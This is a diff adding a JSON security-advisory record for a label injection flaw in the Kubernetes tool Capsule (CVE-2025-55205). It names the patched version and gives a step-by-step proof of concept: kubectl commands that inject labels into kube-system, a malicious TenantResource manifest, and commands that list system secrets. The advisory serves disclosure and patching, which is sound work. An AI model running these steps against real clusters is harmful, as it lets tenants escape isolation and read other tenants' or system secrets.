@@ -1,0 +1,59 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2025-08-18T21:00:38Z",
+  "Package": {
+    "Ecosystem": "GO",
+    "Name": "github.com/projectcapsule/capsule"
+  },
+  "Advisory": {
+    "DatabaseId": 307943,
+    "Id": "GSA_kwCzR0hTQS1mY3BtLTZteHEtbTV2ds4ABLLn",
+    "GhsaId": "GHSA-fcpm-6mxq-m5vv",
+    "References": [
+      {
+        "Url": "https://github.com/projectcapsule/capsule/security/advisories/GHSA-fcpm-6mxq-m5vv"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-55205"
+      },
+      {
+        "Url": "https://github.com/projectcapsule/capsule/commit/e1f47feade6e1695b2204407607d07c3b3994f6e"
+      },
+      {
+        "Url": "https://pkg.go.dev/vuln/GO-2025-3893"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-fcpm-6mxq-m5vv"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-fcpm-6mxq-m5vv"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-55205"
+      }
+    ],
+    "Description": "### Summary\nA namespace label injection vulnerability in Capsule v0.10.3 allows authenticated tenant users to inject arbitrary labels into system namespaces (kube-system, default, capsule-system), bypassing multi-tenant isolation and potentially accessing cross-tenant resources through TenantResource selectors. This vulnerability enables privilege escalation and violates the fundamental security boundaries that Capsule is designed to enforce.\n\n### Details\nThe vulnerability exists in the namespace validation webhook logic located in `pkg/webhook/namespace/validation/patch.go:60-77`. The critical flaw is in the conditional check that only validates tenant ownership when a namespace already has a tenant label:\n\n```go\nif label, ok := ns.Labels[ln]; ok {\n    // Only checks permissions when namespace has tenant label\n    if !utils.IsTenantOwner(tnt.Spec.Owners, req.UserInfo) {\n        response := admission.Denied(e)\n        return \u0026response\n    }\n}\n\nreturn nil  // Critical issue: allows operation if no tenant label exists\n```\n\n**Root Cause Analysis:**\n1. **Missing Default Protection**: System namespaces (kube-system, default, capsule-system) do not have the `capsule.clastix.io/tenant` label by default\n2. **Bypass Logic**: The webhook only enforces tenant ownership validation when the target namespace already belongs to a tenant\n3. **Unrestricted Label Injection**: Authenticated users can inject arbitrary labels into unprotected namespaces\n\n**Attack Vector Path:**\n```\nLabel Injection (user-controlled) → Namespace Selector (system matching) → TenantResource/Quota Check (authorization bypass) → Cross-tenant Resource Access\n```\n\nThis mirrors the CVE-2024-39690 attack pattern but uses label injection instead of ownerReference manipulation:\n- **CVE-2024-39690**: `ownerReference(user-controlled) → tenant.Status.Namespaces(system state) → quota/permission check(auth policy) → namespace hijacking`\n- **This vulnerability**: `Label injection(user-controlled) → Namespace selector(system matching) → TenantResource/Quota check(auth policy) → cross-tenant resource access`\n\n### PoC\n**Prerequisites:**\n- Minikube cluster with Capsule v0.10.3 installed\n- Authenticated tenant user with basic RBAC permissions\n\n**Step 1: Environment Setup**\n```bash\n# Install Minikube and Capsule\nminikube start\nhelm repo add projectcapsule https://projectcapsule.github.io/charts\nhelm install capsule projectcapsule/capsule -n capsule-system --create-namespace\n\n# Create tenant and user\nkubectl create -f - \u003c\u003c EOF\napiVersion: capsule.clastix.io/v1beta2\nkind: Tenant\nmetadata:\n  name: tenant1\nspec:\n  owners:\n  - name: alice\n    kind: User\nEOF\n\n# Create user certificate and kubeconfig (using provided script)\n./create-user-minikube.sh alice tenant1\n```\n\n**Step 2: Label Injection Attack**\n```bash\n# Switch to attacker context\nexport KUBECONFIG=alice-tenant1.kubeconfig\n\n# Inject malicious labels into system namespaces\nkubectl patch namespace kube-system --type='json' -p='[\n  {\n    \"op\": \"add\",\n    \"path\": \"/metadata/labels/malicious-label\",\n    \"value\": \"attack-value\"\n  }\n]'\n\n# Verify injection success\nkubectl get namespace kube-system --show-labels\n```\n\n**Step 3: Exploitation via TenantResource**\n```bash\n# Create attacker-controlled namespace\nkubectl create namespace alice-attack\n\n# Create malicious TenantResource targeting injected labels\ncat \u003c\u003cEOF | kubectl apply -f -\napiVersion: capsule.clastix.io/v1beta2\nkind: TenantResource\nmetadata:\n  name: malicious-resource\n  namespace: alice-attack\nspec:\n  resyncPeriod: 60s\n  resources:\n  - namespaceSelector:\n      matchLabels:\n        malicious-label: \"attack-value\"\nEOF\n\n# Verify cross-tenant access\nkubectl get tenantresource -n alice-attack malicious-resource -o yaml\n```\n\n**Step 4: Verification of Impact**\n```bash\n# Check if system namespace resources are now accessible\nexport KUBECONFIG=~/.kube/config\nkubectl get namespaces -l \"malicious-label=attack-value\"\n# Output shows: kube-system (and potentially other injected namespaces)\n\n# Check for potential resource replication/access\nkubectl get all -n kube-system\nkubectl get secrets -n kube-system\nkubectl get configmaps -n kube-system\n```\n\n**Automated Testing Script:**\nA complete vulnerability verification script is available that tests:\n- Label injection into multiple system namespaces\n- TenantResource exploitation\n- Cross-tenant resource access verification\n- Impact assessment and cleanup\n\n### Impact\n**Vulnerability Type:** Authorization Bypass / Privilege Escalation\n\n**Who is Impacted:**\n- **Multi-tenant Kubernetes clusters** using Capsule v0.10.3 and potentially earlier versions\n- **Organizations relying on Capsule** for tenant isolation and resource governance\n- **Cloud service providers** offering Kubernetes-as-a-Service with Capsule-based multi-tenancy\n\n**Security Impact:**\n1. **Multi-tenant Isolation Bypass**: Attackers can access resources from other tenants or system namespaces\n2. **Privilege Escalation**: Tenant users can gain access to cluster-wide resources and sensitive system components\n3. **Data Exfiltration**: Potential access to secrets, configmaps, and other sensitive data in system namespaces\n4. **Resource Quota Bypass**: Ability to consume resources outside assigned tenant boundaries\n5. **Policy Circumvention**: Bypass network policies, security policies, and other tenant-level restrictions\n\n**Real-world Exploitation Scenarios:**\n- Access to kube-system secrets containing cluster certificates and service account tokens\n- Modification or replication of critical system configurations\n- Cross-tenant data access in shared clusters\n- Potential cluster-wide compromise through system namespace access\n\n**Severity:** High - This vulnerability fundamentally breaks the multi-tenant security model that Capsule is designed to provide, allowing authenticated users to escape their tenant boundaries and access system-level resources.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-08-18T21:00:36Z",
+    "Severity": "CRITICAL",
+    "Summary": "Capsule tenant owners with \"patch namespace\" permission can hijack system namespaces label",
+    "UpdatedAt": "2025-08-29T20:35:26Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.1,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.10.4"
+      },
+      "VulnerableVersionRange": "\u003c 0.10.4"
+    }
+  ]
+}
